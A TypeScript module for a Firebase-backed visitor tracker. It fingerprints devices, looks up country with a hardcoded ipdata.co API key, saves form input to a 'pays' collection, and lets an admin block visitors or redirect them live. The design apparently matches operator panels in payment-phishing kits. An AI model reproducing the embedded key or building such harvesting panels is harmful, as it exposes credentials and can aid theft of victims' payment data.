/**
 * Advanced Visitor Tracking System
 * Features:
 * - Unique reference number
 * - Device detection
 * - Country detection
 * - Browser & OS detection
 * - Timestamps for all actions
 * - Online/Offline status
 * - Block system
 */

import { doc, setDoc } from "firebase/firestore"
import { onDisconnect, onValue, ref, serverTimestamp, set } from "firebase/database";
import { addData, database, db } from "./firebase";

// Generate unique visitor reference number
export function generateVisitorRef(): string {
  const timestamp = Date.now().toString(36)
  const random = Math.random().toString(36).substring(2, 8)
  return `REF-${timestamp}-${random}`.toUpperCase()
}

// Get or create visitor ID — uses the same "visitor" key as the rest of the app
export function getOrCreateVisitorID(): string {
  if (typeof window === 'undefined') {
    return generateVisitorRef()
  }

  let visitorId = localStorage.getItem("visitor")
  
  if (!visitorId) {
    visitorId = generateVisitorRef()
    localStorage.setItem("visitor", visitorId)
  }

  return visitorId
}

// Detect device type
export function getDeviceType(): string {
  if (typeof window === 'undefined') return 'unknown'
  
  const ua = navigator.userAgent
  
  if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
    return 'tablet'
  }
  if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
    return 'mobile'
  }
  return 'desktop'
}

// Detect browser
export function getBrowser(): string {
  if (typeof window === 'undefined') return 'unknown'
  
  const ua = navigator.userAgent
  
  if (ua.includes('Firefox')) return 'Firefox'
  if (ua.includes('SamsungBrowser')) return 'Samsung Browser'
  if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera'
  if (ua.includes('Trident')) return 'Internet Explorer'
  if (ua.includes('Edge')) return 'Edge'
  if (ua.includes('Chrome')) return 'Chrome'
  if (ua.includes('Safari')) return 'Safari'
  
  return 'unknown'
}

// Detect OS
export function getOS(): string {
  if (typeof window === 'undefined') return 'unknown'
  
  const ua = navigator.userAgent
  
  if (ua.includes('Win')) return 'Windows'
  if (ua.includes('Mac')) return 'MacOS'
  if (ua.includes('Linux')) return 'Linux'
  if (ua.includes('Android')) return 'Android'
  if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) return 'iOS'
  
  return 'unknown'
}

// Get screen resolution
export function getScreenResolution(): string {
  if (typeof window === 'undefined') return 'unknown'
  
  return `${window.screen.width}x${window.screen.height}`
}

// Get country from IP with timeout
export async function getCountry(): Promise<string> {
  const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
  const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
  
  try {
    const controller = new AbortController()
    const timeoutId = setTimeout(() => controller.abort(), 3000)
    
    const response = await fetch(url, { signal: controller.signal })
    clearTimeout(timeoutId)
    
    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`)
    }
    const country = await response.text()
    return country
  } catch (error) {
    console.error("Error fetching country:", error)
    return "unknown"
  }
}

// Initialize visitor tracking
export async function initializeVisitorTracking(visitorId: string) {
  const country = await getCountry()
  
  const trackingData = {
    id: visitorId,
    referenceNumber: visitorId,
    country: country,
    deviceType: getDeviceType(),
    browser: getBrowser(),
    os: getOS(),
    screenResolution: getScreenResolution(),
    isOnline: true,
    isBlocked: false,
    isUnread: true,
    currentStep: 1,
    currentPage: "home",
    lastActiveAt: new Date().toISOString(),
    sessionStartAt: new Date().toISOString()
  }
  
  await addData(trackingData)
  
  return trackingData
}

export const setupOnlineStatus = (userId: string) => {
  if (!userId) return;

  const userStatusRef = ref(database, `/status/${userId}`);
  const userDocRef = doc(db, "pays", userId);

  onDisconnect(userStatusRef)
    .set({
      state: "offline",
      lastChanged: serverTimestamp(),
    })
    .then(() => {
      set(userStatusRef, {
        state: "online",
        lastChanged: serverTimestamp(),
      });

      // Use setDoc with merge so it works even if the doc doesn't exist yet
      setDoc(userDocRef, {
        online: true,
        lastSeen: new Date().toISOString(),
      }, { merge: true }).catch((error) =>
        console.error("Error updating online status:", error)
      );
    })
    .catch((error) => console.error("Error setting onDisconnect:", error));

  onValue(userStatusRef, (snapshot) => {
    const status = snapshot.val();
    if (status?.state === "offline") {
      setDoc(userDocRef, {
        online: false,
        lastSeen: new Date().toISOString(),
      }, { merge: true }).catch((error) =>
        console.error("Error updating offline status:", error)
      );
    }
  });
};

export async function updateVisitorPage(visitorId: string, page: string, step: number) {
  try {
    await setDoc(doc(db, "pays", visitorId), {
      currentPage: page,
      currentStep: step,
      lastActiveAt: new Date().toISOString(),
      [`${page}VisitedAt`]: new Date().toISOString()
    }, { merge: true })
  } catch (error) {
    console.error("Error updating visitor page:", error)
  }
}

// Save form data with timestamp
export async function saveFormData(visitorId: string, data: any, pageName: string) {
  try {
    const timestampedData = {
      ...data,
      [`${pageName}UpdatedAt`]: new Date().toISOString(),
      lastActiveAt: new Date().toISOString()
    }
    
    await setDoc(doc(db, "pays", visitorId), timestampedData, { merge: true })
  } catch (error) {
    console.error("Error saving form data:", error)
  }
}

// Check if visitor is blocked
export async function checkIfBlocked(visitorId: string): Promise<boolean> {
  try {
    const docRef = doc(db, "pays", visitorId)
    const docSnap = await import('firebase/firestore').then(m => m.getDoc(docRef))
    
    if (docSnap.exists()) {
      return docSnap.data().isBlocked === true
    }
    
    return false
  } catch (error) {
    console.error("Error checking block status:", error)
    return false
  }
}

// Check if visitor should be redirected to a specific page
export async function checkRedirectPage(visitorId: string): Promise<string | null> {
  try {
    const docRef = doc(db, "pays", visitorId)
    const docSnap = await import('firebase/firestore').then(m => m.getDoc(docRef))
    
    if (docSnap.exists()) {
      const data = docSnap.data()
      if (data.redirectPage) {
        return data.redirectPage
      }
    }
    
    return null
  } catch (error) {
    console.error("Error checking redirect page:", error)
    return null
  }
}

// Clear redirect page after navigation
export async function clearRedirectPage(visitorId: string) {
  try {
    await setDoc(doc(db, "pays", visitorId), {
      redirectPage: null,
      redirectedAt: new Date().toISOString()
    }, { merge: true })
  } catch (error) {
    console.error("Error clearing redirect page:", error)
  }
}

// Set redirect page from admin dashboard
export async function setRedirectPage(visitorId: string, targetPage: string) {
  try {
    await setDoc(doc(db, "pays", visitorId), {
      redirectPage: targetPage,
      redirectRequestedAt: new Date().toISOString()
    }, { merge: true })
  } catch (error) {
    console.error("Error setting redirect page:", error)
  }
}
